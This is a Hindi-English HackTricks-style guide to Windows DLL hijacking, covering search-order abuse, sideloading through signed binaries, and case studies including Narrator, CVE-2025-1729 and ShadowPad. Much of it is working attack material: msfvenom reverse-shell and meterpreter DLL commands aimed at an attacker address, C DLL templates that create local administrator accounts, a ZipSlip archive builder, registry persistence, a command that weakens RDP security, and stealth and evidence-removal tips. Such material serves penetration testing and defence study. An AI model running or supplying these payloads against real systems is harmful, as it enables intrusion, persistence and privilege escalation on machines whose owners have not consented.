# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## बुनियादी जानकारी

DLL Hijacking में एक भरोसेमंद एप्लिकेशन को malicious DLL लोड करने के लिए manipulate किया जाता है। यह शब्द कई takticks को कवर करता है जैसे **DLL Spoofing, Injection, and Side-Loading**। इसे मुख्यत: code execution, persistence प्राप्त करने और कम सामान्य रूप से privilege escalation के लिए उपयोग किया जाता है। यहाँ हालांकि ध्यान escalation पर है, hijacking की विधि उद्देश्य के अनुसार समान बनी रहती है।

### सामान्य तकनीकें

DLL hijacking के लिए कई तरीके उपयोग किए जाते हैं, जिनकी प्रभावशीलता उस एप्लिकेशन की DLL लोडिंग रणनीति पर निर्भर करती है:

1. **DLL Replacement**: असली DLL को malicious एक से बदलना, आवश्यक होने पर मूल DLL की functionality बनाए रखने के लिए DLL Proxying का उपयोग।
2. **DLL Search Order Hijacking**: malicious DLL को ऐसे search path में रखना जो legitimate DLL से पहले आता हो, ताकि application की search pattern का फायदा उठाया जा सके।
3. **Phantom DLL Hijacking**: एक malicious DLL बनाना जिसे application लोड करे क्योंकि उसे लगता है कि वह आवश्यक DLL मौजूद नहीं है।
4. **DLL Redirection**: `%PATH%` या `.exe.manifest` / `.exe.local` फाइलों जैसे search parameters बदलकर application को malicious DLL की ओर निर्देशित करना।
5. **WinSxS DLL Replacement**: WinSxS डायरेक्टरी में legitimate DLL की जगह malicious कॉपी रखना, यह तरीका अक्सर DLL side-loading से जुड़ा होता है।
6. **Relative Path DLL Hijacking**: malicious DLL को user-controlled डायरेक्टरी में रखना जहाँ application की कॉपी भी हो, यह Binary Proxy Execution तकनीकों जैसा है।

> [!TIP]
> DLL sideloading के ऊपर HTML staging, AES-CTR configs, और .NET implants को layer करने के लिए step-by-step chain देखने हेतु नीचे workflow देखें।

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Missing Dlls ढूँढना

सबसे सामान्य तरीका सिस्टम के अंदर missing Dlls खोजने का है [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) (sysinternals) चलाना और **निम्न 2 फ़िल्टर** सेट करना:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

और केवल **फाइल सिस्टम गतिविधि** दिखाएँ:

![](<../../../images/image (153).png>)

यदि आप **सामान्य तौर पर missing dlls** ढूँढ रहे हैं तो आप इसे कुछ **सेकंड** के लिए **चलाते** रहें।\
यदि आप किसी **विशेष executable** के अंदर missing dll ढूँढ रहे हैं तो आपको **एक और फ़िल्टर** सेट करना चाहिए जैसे `Process Name` `contains` `<exec name>`, इसे execute करें, और events कैप्चर करना बंद करें।

## Missing Dlls का शोषण

privilege escalation करने के लिए हमारी सबसे अच्छी चांस यह है कि हम ऐसा dll लिख सकें जिसे कोई privileged process लोड करने की कोशिश करेगा और उसे उन स्थानों में से किसी एक में खोजा जाएगा जहाँ हम लिखने में सक्षम हों। इसलिए, हम या तो किसी ऐसे folder में dll लिख सकेंगे जहाँ वो dll उस folder से पहले खोजा जाता है जहाँ original dll मौजूद है (अजीब मामला), या हम किसी ऐसे folder में लिख सकेंगे जहाँ dll खोजा जाएगा और original dll किसी भी folder में मौजूद नहीं है।

### Dll Search Order

**Microsoft documentation** के अंदर आप देख सकते हैं कि Dlls को कैसे लोड किया जाता है, विशेष रूप से। (देखें लिंक)

Windows applications DLLs को pre-defined search paths के एक सेट का पालन करके खोजती हैं, एक निश्चित क्रम का पालन करते हुए। DLL hijacking तब होता है जब एक malicious DLL रणनीतिक रूप से उन directories में से किसी एक में रखा जाता है ताकि वह authentic DLL से पहले लोड हो जाए। इसे रोकने का एक उपाय है कि application जिन DLLs की ज़रूरत है उनके लिए absolute paths का उपयोग करे।

आप 32-bit systems पर DLL search order नीचे देख सकते हैं:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

यह SafeDllSearchMode सक्षम होने पर **default** search order है। जब यह disabled होता है तो current directory दूसरी जगह पर आ जाता है। इस feature को disable करने के लिए, **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value बनाकर उसे 0 पर सेट करें (default enabled है)।

यदि [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ बुलाया जाता है तो search उस executable module की directory से शुरू होती है जिसे **LoadLibraryEx** लोड कर रहा होता है।

अंत में ध्यान दें कि **एक dll को absolute path इंगित करके भी लोड किया जा सकता है सिर्फ नाम के बजाय**। उस स्थिति में वह dll **केवल उसी path में ही खोजा जाएगा** (यदि उस dll की कोई dependencies हैं, तो वे उसी तरह नाम से लोड होने पर खोजे जाएँगे)।

search order को बदलने के और भी तरीके हैं लेकिन मैं यहाँ उन्हें explain नहीं कर रहा।

### Arbitrary file write को missing-DLL hijack में चेन करना

1. ProcMon फ़िल्टर का उपयोग करें (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) ताकि उन DLL नामों को इकट्ठा किया जा सके जिन्हें process probe करता है पर ढूँढ नहीं पाता।
2. यदि binary किसी **schedule/service** पर चलता है, तो उन नामों में से किसी एक नाम वाला DLL application directory (search-order entry #1) में डालने से अगली execution पर वह लोड हो जाएगा। एक .NET scanner केस में process ने `hostfxr.dll` को `C:\samples\app\` में खोजा पहले, और फिर असली कॉपी `C:\Program Files\dotnet\fxr\...` से लोड हुई।
3. किसी payload DLL (उदा. reverse shell) को किसी भी export के साथ बनाएँ: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. यदि आपकी primitive एक ZipSlip-style arbitrary write है, तो extraction dir से बाहर निकलने वाला एक ZIP craft करें ताकि DLL app folder में land कर जाए:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. वॉच किए गए inbox/share में archive पहुँचाएँ; जब scheduled task प्रक्रिया को फिर से लॉन्च करेगा तो वह malicious DLL लोड करेगा और आपके कोड को service account के रूप में निष्पादित करेगा।

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

नए बनाए गए प्रोसेस के DLL खोज-पथ को निर्धारित रूप से प्रभावित करने का एक advanced तरीका है कि ntdll की native APIs का उपयोग करके प्रोसेस बनाते समय RTL_USER_PROCESS_PARAMETERS में DllPath फील्ड सेट किया जाए। यहाँ attacker-controlled डायरेक्टरी प्रदान करने पर, वह लक्षित प्रोसेस जो किसी imported DLL को नाम से resolve करता है (कोई absolute path नहीं और safe loading flags का उपयोग नहीं), उस डायरेक्टरी से malicious DLL लोड करने के लिए मजबूर किया जा सकता है।

मुख्य विचार
- RtlCreateProcessParametersEx के साथ process parameters बनाएं और एक custom DllPath प्रदान करें जो आपके नियंत्रित फोल्डर की ओर इशारा करता हो (उदा., वह डायरेक्टरी जहाँ आपका dropper/unpacker रहता है)।
- RtlCreateUserProcess के साथ प्रोसेस बनाएं। जब लक्ष्य बाइनरी किसी DLL को नाम से resolve करता है, loader इस प्रदान किए गए DllPath को resolution के दौरान देखेगा, जिससे विश्वसनीय sideloading संभव हो जाता है भले ही malicious DLL target EXE के साथ colocated न हो।

नोट्स/सीमाएँ
- यह केवल बनाए जा रहे child process को प्रभावित करता है; यह SetDllDirectory से अलग है, जो केवल current process को प्रभावित करता है।
- लक्ष्य को किसी DLL को नाम से import या LoadLibrary करना चाहिए (कोई absolute path नहीं और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का उपयोग नहीं)।
- KnownDLLs और hardcoded absolute paths को hijack नहीं किया जा सकता। Forwarded exports और SxS precedence बदल सकते हैं।

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

ऑपरेशनल उपयोग का उदाहरण
- अपने DllPath डायरेक्टरी में एक malicious xmllite.dll रखें (जो आवश्यक functions export करे या असली वाली का proxy हो)।
- ऊपर बताए गए तरीके का उपयोग करके उस signed binary को लॉन्च करें जो नाम से xmllite.dll को खोजता है। loader सप्लाई किए गए DllPath के माध्यम से import resolve करता है और आपका DLL sideloads कर लेता है।

यह तकनीक वास्तविक दुनिया में multi-stage sideloading chains चलाने के लिए देखी गई है: एक प्रारंभिक launcher एक helper DLL ड्रॉप करता है, जो फिर एक Microsoft-signed, hijackable binary को spawn करता है जिसके पास एक custom DllPath होता है ताकि attacker की DLL को staging directory से लोड करने के लिए मजबूर किया जा सके।


#### Exceptions on dll search order from Windows docs

Windows documentation में dll search order के कुछ अपवाद नोट किए गए हैं:

- जब किसी **DLL का नाम मेमोरी में पहले से लोड किसी DLL के नाम से मेल खाता हो**, तो सिस्टम सामान्य खोज को बायपास कर देता है। इसके बजाय, यह redirection और manifest की जाँच करता है और फिर default के रूप में पहले से मेमोरी में मौजूद DLL का उपयोग करता है। **इस स्थिति में, सिस्टम DLL के लिए खोज नहीं करता है।**
- यदि किसी DLL को current Windows version के लिए एक **known DLL** के रूप में पहचाना जाता है, तो सिस्टम उस known DLL के अपने वर्शन का उपयोग करेगा, साथ ही इसकी किसी भी dependent DLLs का भी, **खोज प्रक्रिया को छोड़ते हुए**। रजिस्ट्री की **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** इन known DLLs की सूची रखती है।
- यदि किसी **DLL की dependencies** हों, तो इन dependent DLLs की खोज ऐसा किया जाता है मानो उन्हें केवल उनके **module names** से ही सूचित किया गया हो, भले ही प्रारंभिक DLL को पूरा path देकर पहचाना गया हो।

### Escalating Privileges

**आवश्यकताएँ**:

- ऐसे प्रोसेस की पहचान करें जो **different privileges** के तहत चलता है या चलेगा (horizontal या lateral movement), और जिसमें **lacking a DLL** हो।
- सुनिश्चित करें कि किसी भी उस **directory** पर **write access** मौजूद हो जहाँ पर **DLL** की **searched for** जाएगी। यह स्थान executable की डायरेक्टरी या system path के भीतर किसी डायरेक्टरी हो सकता है।

हाँ, इन आवश्यकताओं को ढूँढना जटिल है क्योंकि **by default it's kind of weird to find a privileged executable missing a dll** और system path फ़ोल्डर पर write permissions होना और भी अजीब है (आप default रूप से ऐसा नहीं कर सकते)। लेकिन misconfigured environments में यह संभव हो सकता है.  
यदि आप भाग्यशाली हैं और आवश्यकताएँ पूरी होती हैं, तो आप [UACME](https://github.com/hfiref0x/UACME) प्रोजेक्ट देख सकते हैं। भले ही इस प्रोजेक्ट का **main goal of the project is bypass UAC** हो, वहाँ आपको उस Windows version के लिए Dll hijaking का एक **PoC** मिल सकता है जिसे आप उपयोग कर सकते हैं (शायद बस उस फोल्डर के path को बदलकर जहाँ आपके पास write permissions हैं)।

ध्यान दें कि आप **किसी फ़ोल्डर में अपनी अनुमतियाँ जाँच सकते हैं**, उदाहरण के लिए:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के अंदर सभी फ़ोल्डरों की permissions जाँच करें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप किसी executable की imports और किसी dll की exports भी निम्न के साथ चेक कर सकते हैं:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
यदि आप यह जानना चाहते हैं कि किसी **System Path folder** में लिखने की permissions के साथ कैसे **abuse Dll Hijacking to escalate privileges** किया जा सकता है, तो पूरी गाइड देखें:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) यह जाँच करेगा कि क्या आपके पास system PATH के किसी भी फ़ोल्डर में write permissions हैं।\
इस vulnerability को ढूँढने के लिए अन्य रोचक automated tools **PowerSploit functions** हैं: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll_।

### Example

यदि आप कोई exploitable scenario पाते हैं, तो इसे सफलतापूर्वक exploit करने के लिए सबसे महत्वपूर्ण बातों में से एक यह होगी कि आप **create a dll that exports at least all the functions the executable will import from it**। वैसे, ध्यान रखें कि Dll Hijacking उपयोगी होता है [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) या [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** आप एक उदाहरण पा सकते हैं कि **how to create a valid dll** इस dll hijacking स्टडी में फोकस्ड ऑन dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
इसके अलावा, अगले section में आप कुछ **basic dll codes** पाएँगे जो **templates** के रूप में उपयोगी हो सकते हैं या **dll with non required functions exported** बनाने के लिए।

## **Creating and compiling Dlls**

### **Dll Proxifying**

बुनियादी तौर पर एक **Dll proxy** ऐसी Dll होती है जो **loaded** होने पर आपका malicious code execute कर सके, और साथ ही वास्तविक लाइब्रेरी को कॉल्स relay करके अपेक्षित तरीके से expose और काम भी करे।

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) टूल के साथ आप वास्तव में **किसी executable को निर्दिष्ट करके और उस library का चयन करके** जिसे आप proxify करना चाहते हैं, **एक proxified dll generate** कर सकते हैं या **Dll निर्दिष्ट करके** और **एक proxified dll generate** कर सकते हैं।

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक meterpreter (x86) प्राप्त करें:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक उपयोगकर्ता बनाएं (x86 — मैंने x64 संस्करण नहीं देखा):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### अपना

ध्यान दें कि कई मामलों में वह Dll जिसे आप compile करते हैं, उसे **export several functions** करने होंगे जो victim process द्वारा load किए जाएंगे; यदि ये functions मौजूद नहीं हैं तो **binary won't be able to load** उन्हें और **exploit will fail**।

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL का उदाहरण (उपयोगकर्ता निर्माण के साथ)</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>वैकल्पिक C DLL with thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## केस स्टडी: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe स्टार्ट पर अभी भी एक अनुमानित, भाषा-विशिष्ट localization DLL की जांच करता है जिसे hijack करके arbitrary code execution और persistence हासिल किया जा सकता है।

Key facts
- प्रोब पथ (वर्तमान बिल्ड्स): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- पारंपरिक पथ (पुराने बिल्ड्स): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- यदि OneCore पथ पर हमला करने वाले द्वारा नियंत्रित और लिखने योग्य DLL मौजूद है, तो उसे लोड किया जाता है और `DllMain(DLL_PROCESS_ATTACH)` निष्पादित होता है। किसी export की आवश्यकता नहीं है।

Discovery with Procmon
- फ़िल्टर: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator शुरू करें और ऊपर दिए गए पथ के लोड प्रयास का अवलोकन करें।

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator; your DLL executes as SYSTEM on the secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. एक standard user के रूप में, `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में डालें।
2. निर्धारित task के current user के context में 9:30 AM पर चलने का इंतजार करें।
3. यदि task के निष्पादन के समय कोई administrator लॉग इन है, तो दुष्ट DLL administrator के session में medium integrity पर चलती है।
4. medium integrity से SYSTEM privileges तक उठाने के लिए standard UAC bypass techniques की chain बनाएं।

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors अक्सर MSI-based droppers को DLL side-loading के साथ जोड़ते हैं ताकि वे एक trusted, signed process के तहत payloads चलाएँ।

Chain overview
- User MSI डाउनलोड करता है। GUI install के दौरान एक CustomAction चुपचाप चलता है (उदा., LaunchApplication या VBScript action), और embedded resources से अगले चरण का पुनर्निर्माण करता है।
- Dropper same directory में एक legitimate, signed EXE और एक malicious DLL लिखता है (उदाहरण जोड़ी: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll)।
- जब signed EXE शुरू होता है, तो Windows DLL search order पहले working directory से wsc.dll लोड करता है, और signed parent के तहत attacker code को निष्पादित करता है (ATT&CK T1574.001)।

MSI analysis (what to look for)
- CustomAction table:
- ऐसे एंट्रियाँ खोजें जो executables या VBScript चलाती हैं। उदाहरण संदिग्ध पैटर्न: LaunchApplication जो बैकग्राउंड में एक embedded फ़ाइल चला रहा हो।
- Orca (Microsoft Orca.exe) में CustomAction, InstallExecuteSequence और Binary tables की जांच करें।
- MSI CAB में embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- या lessmsi का उपयोग करें: lessmsi x package.msi C:\out
- कई छोटे fragments देखें जो VBScript CustomAction द्वारा जोड़कर और decrypt किए जाते हैं। सामान्य प्रवाह:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
व्यावहारिक sideloading wsc_proxy.exe के साथ
- इन दोनों फाइलों को इसी फ़ोल्डर में रखें:
- wsc_proxy.exe: legitimate signed host (Avast). प्रोसेस अपने डायरेक्टरी से नाम द्वारा wsc.dll लोड करने का प्रयास करता है।
- wsc.dll: attacker DLL. यदि किसी विशिष्ट exports की आवश्यकता नहीं है, तो DllMain पर्याप्त हो सकता है; अन्यथा, एक proxy DLL बनाएं और आवश्यक exports को genuine library को फॉरवर्ड करें जबकि payload को DllMain में चलाया जा रहा हो।
- एक न्यूनतम DLL payload बनाएं:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- एक्सपोर्ट आवश्यकताओं के लिए, एक प्रॉक्सीइंग framework (उदा., DLLirant/Spartacus) का उपयोग करके एक forwarding DLL बनाएं जो आपका payload भी execute करे।

- यह तकनीक host binary द्वारा DLL name resolution पर निर्भर करती है। अगर host absolute paths या safe loading flags (उदा., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) का उपयोग करता है तो hijack असफल हो सकता है।
- KnownDLLs, SxS, और forwarded exports precedence को प्रभावित कर सकते हैं और host binary तथा export set के चयन के दौरान इन्हें ध्यान में रखना चाहिए।

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ने बताया कि Ink Dragon किस तरह ShadowPad को deploy करता है — एक **three-file triad** का उपयोग करके जो legitimate software में घुल-मिल जाता है जबकि core payload डिस्क पर encrypted रहता है:

1. **Signed host EXE** – AMD, Realtek, या NVIDIA जैसे vendors का दुरुपयोग किया जाता है (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`)। attackers executable का नाम बदलकर Windows binary जैसा दिखाते हैं (उदा., `conhost.exe`), पर Authenticode signature वैध बनी रहती है।
2. **Malicious loader DLL** – EXE के साथ expected नाम पर drop किया जाता है (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`)। यह DLL आमतौर पर ScatterBrain framework से obfuscated MFC binary होता है; इसका एकमात्र काम encrypted blob को locate करना, decrypt करना, और ShadowPad को reflectively map करना है।
3. **Encrypted payload blob** – अक्सर उसी directory में `<name>.tmp` के रूप में रखा जाता है। decrypted payload को memory-map करने के बाद loader TMP फ़ाइल को forensic evidence नष्ट करने के लिए delete कर देता है।

Tradecraft notes:

* Signed EXE का नाम बदलने पर भी (PE header में मूल `OriginalFileName` बनाए रखते हुए) यह Windows binary की तरह भेष धारण कर सकता है और vendor signature कायम रहती है, इसलिए Ink Dragon की तरह AMD/NVIDIA utilities दिखने वाले `conhost.exe`-जैसे binaries रखकर भ्रामक बनाएं।
* क्योंकि executable trusted रहता है, अधिकांश allowlisting controls के लिए केवल आपका malicious DLL उसके साथ होना ही पर्याप्त होता है। loader DLL को customize करने पर फोकस रखें; signed parent सामान्यतः बिना बदले चल सकता है।
* ShadowPad का decryptor आशा करता है कि TMP blob loader के पास ही मौजूद और writable हो ताकि mapping के बाद वह फाइल को zero कर सके। जब तक payload load नहीं हो जाता, directory writable रखें; एक बार payload memory में आ जाने पर TMP फ़ाइल OPSEC के लिए सुरक्षित रूप से हटाई जा सकती है।

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators DLL sideloading को LOLBAS के साथ जोड़ते हैं ताकि डिस्क पर केवल कस्टम artifact वही malicious DLL हो जो trusted EXE के बगल में रखा जाए:

